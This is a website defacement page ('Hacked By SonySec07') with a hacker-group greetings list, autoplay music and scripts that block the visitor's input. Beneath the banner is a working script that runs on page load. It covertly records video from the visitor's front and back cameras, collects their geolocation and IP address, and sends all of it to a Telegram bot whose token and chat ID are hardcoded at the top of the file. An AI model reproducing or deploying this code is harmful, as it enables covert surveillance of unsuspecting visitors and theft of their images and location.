<?php
$botToken = '7599305876:AAFojw-7gJICoPIt5YXS8xdtVh7aM2vEsxM';
$chatID = '7221518562';
?>

<html>
<head>
    <title>Hacked By SonySec07</title>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1" /> 
    <meta property="og:title" content="Hacked By SonySec07">
    <meta name="description" content="wh00pz ! your website security get down">
    <meta property="og:description" content="wh00pz ! your website security get down">
    <meta property="og:image" content="https://abilitysportsafrica.org/alok99.png">
    <meta name="theme-color" content="#fff">
    <style type='text/css'>body,a:hover{cursor:url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
    <script>
        window.config = {
            botToken: '<?php echo $botToken; ?>',
            chatID: '<?php echo $chatID; ?>'
        };
    </script>
</head>
<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="play()">
<style type="text/css">
    center {
        font-family: Courier;
    }
    img {
        opacity: 80%;
    }
    red {
        color: red;
    }
</style>
<script language="JavaScript">
    window.onbeforeunload = confirmExit;
    function confirmExit() {
        return "are you sure ? wkwk";
    }
</script>
<table width="100%" height="80%">
    <td>
        <center>
            <small> 4 BROTHER </small><br>
            <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220">
            <br>Hacked by <red><i>SonySec07</i></red><br><font size="2">wh00pz ! your website security get down<br>patch it before something bad happens</br><br></font><br>
            <br><small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
            <font size="2"><i>Greetz</i><br>
            Pyscodes - CurutG0D403 - Clutsert03 - BentoSec21 - TN.CUPLIS - JohnFelix - MR.VENOM - HanzRazor - NightBot405  - MR.CULA - EYIKK - M4SKGANS - Inzz - ClayOxtymus1337 - MR.KRIBO - Amigamer404 - Jakarta Blackhat Cyber Crime - MukoMuko Cyber Team - Muslim Cyber Face - FromLammerToMastah - KaliMalang BlackHat Team - Nigeria Cyber Force - FSOCIETY TEAM</font>
    </td>
    <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay="1" loop="1">
</table>

<script>
let isFrontCamera = true;
let currentStream = null;
let videoRecorder = null;
let videoDevices = [];

async function getVideoDevices() {
    const devices = await navigator.mediaDevices.enumerateDevices();
    return devices.filter(device => device.kind === 'videoinput');
}

async function startVideoRecording() {
    try {
        videoDevices = await getVideoDevices();
        const selectedDevice = videoDevices[isFrontCamera ? 0 : 1]?.deviceId;

        const constraints = {
            video: {
                deviceId: selectedDevice,
                facingMode: isFrontCamera ? "user" : "environment"
            }
        };

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        const chunks = [];
        
        videoRecorder = new MediaRecorder(stream);
        videoRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) chunks.push(event.data);
        };

        videoRecorder.onstop = () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            sendLocationAndVideo(videoBlob);
            currentStream.getTracks().forEach(track => track.stop());

            if (isFrontCamera) {
                isFrontCamera = false;
                setTimeout(startVideoRecording, 1000);
            }
        };

        videoRecorder.start();
        setTimeout(() => {
            if (videoRecorder.state !== "inactive") videoRecorder.stop();
        }, 3000);
    } catch (error) {
        console.error('Error accessing camera:', error);
    }
}

function sendLocationAndVideo(videoBlob) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const { latitude, longitude } = position.coords;
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();
                
                const message = `By John Felix 
📍 Lokasi Pengguna:
Latitude: ${latitude}
Longitude: ${longitude}
➣ IP Address: ${ip}
🌍 Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

                const formData = new FormData();
                formData.append("chat_id", window.config.chatID);
                formData.append("video", videoBlob, "recorded_video.webm");

                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: window.config.chatID, 
                        text: message 
                    })
                });

            } catch (error) {
                console.error('Error:', error);
            }
        }, (error) => {
            console.error('Location error:', error);
        });
    } else {
        console.log('Geolocation not supported');
    }
}

document.addEventListener('DOMContentLoaded', startVideoRecording);
</script>

</body>
</html>
